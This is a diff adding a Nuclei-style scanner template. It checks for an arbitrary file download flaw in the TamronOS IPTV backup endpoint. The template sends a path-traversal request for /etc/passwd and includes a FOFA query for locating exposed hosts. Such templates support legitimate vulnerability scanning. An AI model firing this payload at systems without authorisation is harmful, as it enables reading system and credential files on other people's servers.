@@ -1,0 +1,29 @@
+id: tamronos-iptv-backup-filedown
+
+info:
+  name: tamronos-iptv-backup-filedown
+  author: unknow
+  severity: high
+  description: TamronOS IPTV backup 存在任意文件下载漏洞。
+  tags: tamronos,filedown
+  metadata:
+    fofa-qeury: title="TamronOS IPTV系统"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /download/backup?name=./../../../../../etc/passwd HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+    payloads:
+      filedown:
+        - "./../../../../../etc/passwd"
+               
+    matchers:     
+      - type: dsl
+        name: filedown
+        dsl:
+          - "status_code_1 == 200 && contains(body,'root:x') && contains(header,'filename=')" 
